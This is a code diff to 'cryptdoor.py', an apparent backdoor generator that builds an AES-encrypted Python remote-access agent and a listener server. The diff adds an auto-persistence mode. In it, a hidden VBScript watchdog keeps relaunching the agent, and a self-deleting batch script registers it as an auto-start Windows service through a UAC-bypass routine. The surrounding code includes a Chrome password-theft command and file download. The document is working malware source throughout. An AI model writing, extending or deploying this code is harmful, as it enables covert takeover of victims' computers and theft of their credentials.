@@ -16,7 +16,7 @@ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
 key, iv, secretkey = randKey(32), randKey(16), randKey(32)
 
-finput = '''# def fscreenshot():
+part1 = '''#def fscreenshot():
 # 	hwnd = 0
 # 	hwndDC = win32gui.GetWindowDC(hwnd)
 # 	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
@@ -175,7 +175,29 @@ if os.name == 'nt':
 			win32api.SetFileAttributes(agent,win32con.FILE_ATTRIBUTE_HIDDEN)
 		except:
 			pass
-	
+'''
+persistpart = '''	else:
+		if isAdmin:
+			vbscript = 'state = 1**nhidden = 0**nwshname = "' + agent + '"**nvbsname = "' + vbsdst + '"**nWhile state = 1**nexist = ReportFileStatus(wshname)**nIf exist = True then**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(wshname)**nset objFSO = CreateObject("Scripting.FileSystemObject")**nset objFile = objFSO.GetFile(vbsname)**nSet WshShell = WScript.CreateObject ("WScript.Shell")**nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")**nFor Each objProcess in colProcessList**nif objProcess.name = "' + agentname + '" then**nvFound = True**nEnd if**nNext**nIf vFound = True then**nwscript.sleep 7000**nElse**nWshShell.Run """' + agent + '""",hidden**nwscript.sleep 7000**nEnd If**nvFound = False**nElse**nwscript.sleep 7000**nEnd If**nWend**nFunction ReportFileStatus(filespec)**nDim fso, msg**nSet fso = CreateObject("Scripting.FileSystemObject")**nIf (fso.FileExists(filespec)) Then**nmsg = True**nElse**nmsg = False**nEnd If**nReportFileStatus = msg**nEnd Function**n'
+			with open(vbsdst, 'w') as pv:
+				pv.write(vbscript)
+			win32api.SetFileAttributes(vbsdst,win32con.FILE_ATTRIBUTE_HIDDEN)
+			cmds = "copy " + sys.argv[0] + ' ' + agent + '**n'
+			cmds += 'sc create win32svc binPath= "cmd.exe /c wscript.exe ' + vbsdst + '" type= own start= auto**n'
+			cmds += 'del ' + tempvbs + '**n'
+			cmds += 'del /AH "%~f0" & sc start win32svc'
+			hb = 'CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False**n'
+			with open(tempvbs, 'w') as hid:
+				hid.write(hb)
+			with open(tempbat, 'w') as cbat:
+				cbat.write(cmds)
+			win32api.SetFileAttributes(tempvbs,win32con.FILE_ATTRIBUTE_HIDDEN)
+			win32api.SetFileAttributes(tempbat,win32con.FILE_ATTRIBUTE_HIDDEN)
+			rcmd = tempvbs + ' ' + tempbat
+			fbypass(rcmd)
+			exit()
+'''
+part2 = '''
 	if is64:
 		if isSystem:
 			success = EncodeAES(cipher, 'E' * 64 + '%sEOFEOFEOFEOFEOSY%s' % (paddedopsys, starpadding))
@@ -223,15 +245,11 @@ while 1:
 		break
 
 	# elif decrypted.startswith('screenshot'):
-	# 	if pwdvar == 'cd':
-	# 		upfile = fscreenshot()
-	# 		with open(upfile, 'rb') as f:
-	# 			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFC" + f.read() + "EOFEOFEOFEOFEOFZ")
-	# 		s.send(encrypted)
-	# 		os.remove(upfile)
-	# 	else:
-	# 		encrypted = EncodeAES(cipher, " [X] screenshot is only available for windows!**nEOFEOFEOFEOFEOFX")
-	# 		s.send(encrypted)
+	# 	upfile = fscreenshot()
+	# 	with open(upfile, 'rb') as f:
+	# 		encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFSEOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZEOFEOFEOFEOFEOFZ")
+	# 	s.send(encrypted)
+	# 	os.remove(upfile)
 
 	elif decrypted.startswith("chromepass"):
 		if pwdvar == 'cd':
@@ -358,21 +376,25 @@ s.close()'''
 try:
 	hostname, portnumber = sys.argv[1], sys.argv[2]
 except:
-	print '  Usage ./cryptdoor.py host port (backdoorname) (servername)\n'
+	print '  Usage ./cryptdoor.py host port'
 	exit()
 
-try:
-	outputName = sys.argv[3]
-except:
-	outputName = "backdoor.py"
+
+backdoorName = "backdoor.py"
+serverName = "server.py"
 
 try:
-	serverName = sys.argv[4]
+	if sys.argv[3] == '-p':
+		finalbackdoor = part1 + persistpart + part2
+		print ' [*] Auto-persistence enabled.'
+	else:
+		finalbackdoor = part1 + part2
+		exit()
 except:
-	serverName = "server.py"
+	finalbackdoor = part1 + part2
 
-readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r')
-f = open(outputName, 'w')
+readyscript = finalbackdoor.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r')
+f = open(backdoorName, 'w')
 cipherEnc = AES.new(key)
 encrypted = EncodeAES(cipherEnc, readyscript)
 
@@ -451,6 +473,11 @@ def fnextcmd():
 		print fhelp()
 		fnextcmd()
 
+	# elif nextcmd.startswith('screenshot'):
+	# 	downfile = 'screenshot_%s.bmp' % (random.randint(100,9999))
+	# 	encrypted = EncodeAES(cipher, nextcmd)
+	# 	s.send(encrypted)
+
 	elif nextcmd.startswith('download '):
 		downfile = nextcmd.split(' ')[1].split(os.sep)[-1]
 		encrypted = EncodeAES(cipher, nextcmd)
@@ -515,21 +542,6 @@ while True:
 		print decrypted[:-16]
 		fnextcmd()
 
-	# elif decrypted.startswith("EOFEOFEOFEOFEOFC"):
-	# 	downfile = 'screenshot_' + str(random.randint(2,9999)) + '.bmp'
-	# 	f = open(downfile, 'wb')
-	# 	f.write(decrypted[16:])
-	# 	while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-	# 		data = s.recv(2048)
-	# 		decrypted = DecodeAES(cipher, data)
-	# 		if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
-	# 			f.write(decrypted[:-16])
-	# 		else:
-	# 			f.write(decrypted)
-	# 	f.close()
-	# 	print ' [*] Screenshot saved to ' + downfile + '**n'
-	# 	fnextcmd()
-
 	elif decrypted.endswith('*' * 16):
 		opsys = decrypted[64:128].strip('*')
 		if decrypted[143:144] == 'Y':
@@ -543,14 +555,16 @@ while True:
 			isSystem = True
 		if decrypted[141:142] == 'S':
 			isSystem = True
-		print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
 		if isSystem:
-			print ' [*] User is SYSTEM, System is %s %s.**n' % (archvar, opsys)
+			uservar = 'SYSTEM'
 		else:
 			if isAdmin:
-				print ' [*] User is Admin!, System is %s %s.**n' % (archvar, opsys)
+				uservar = 'is Admin!'
 			else:
-				print ' [*] User is not Admin, System is %s %s.**n' % (archvar, opsys)
+				uservar = 'is not Admin'
+
+		print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
+		print ' [*] User is %s, System is %s %s.**n' % (uservar, archvar, opsys)
 		fnextcmd()
 
 	elif decrypted[16:32] == "EOFEOFEOFEOFEOFS":
@@ -582,5 +596,5 @@ se = open(serverName, 'wb')
 finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
 se.write(finalserver)
 se.close()
-os.system('chmod +x %s %s' % (outputName, serverName))
-print "\n [*] Backdoor written to %s\n [*] Server written to %s" % (outputName, serverName)
+os.system('chmod +x %s %s' % (backdoorName, serverName))
+print " [*] Backdoor written to %s\n [*] Server written to %s" % (backdoorName, serverName)
